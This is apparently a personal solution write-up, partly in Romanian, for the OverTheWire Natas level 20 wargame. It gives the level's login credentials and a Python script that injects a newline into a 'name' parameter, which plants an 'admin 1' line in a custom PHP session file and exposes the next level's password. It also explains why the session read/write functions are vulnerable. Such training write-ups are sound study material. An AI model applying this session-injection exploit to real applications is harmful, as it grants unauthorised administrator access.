
# General info

Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
URL:      http://natas20.natas.labs.overthewire.org

# Special code section

```py
import requests

response = requests.post(
    url="http://natas20.natas.labs.overthewire.org/index.php",
    auth=("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"),
    params={
        "debug" : "sa fie",
        "name" : "ceva\nadmin 1"
    }
)

sid = response.cookies.get_dict()["PHPSESSID"]

response = requests.post(
    url="http://natas20.natas.labs.overthewire.org/index.php",
    auth=("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"),
    params={
        "debug" : "sa fie"
    },
    cookies={
        "PHPSESSID" : sid
    }
)

if "You are logged in as a regular user" not in response.text:
    print(response.text.split("The credentials for the next level are:<br><pre>")[1].split("</pre>")[0])
else:
    print("some error occurred")
```

Nu merge sa faci vreun fel de shell injection pe file name : trebuie sa fie alfanumeric
Am luat un hint de la un write-up si am reusit sa o scot la capat.
Basically, ce a trebuit sa fac a fost sa inserez un nume cu `\n` in el, precum `ceva\nadmin 1`
Asta deoarece scrierea si citirea din fisier (adica acel _session serialization_) erau functii suprascrise, comportamentul lor era vulnerabil
functia de `myread` citea si insera in `$_SESSION` valori dupa cum le gasea in fisier
daaaar functia de `mywrite` le scria in fisier asa cum le gaseain `$_SESSION`
iar in `$_SESSION` puteam insera `name` din `$_REQUEST`
asa, am inserat un nume random `$_REQUEST["name"] = "ceva\nadmin 1"`, iar cand a fost scris in fisier, s-a scris practic:
```
name ceva
admin 1
```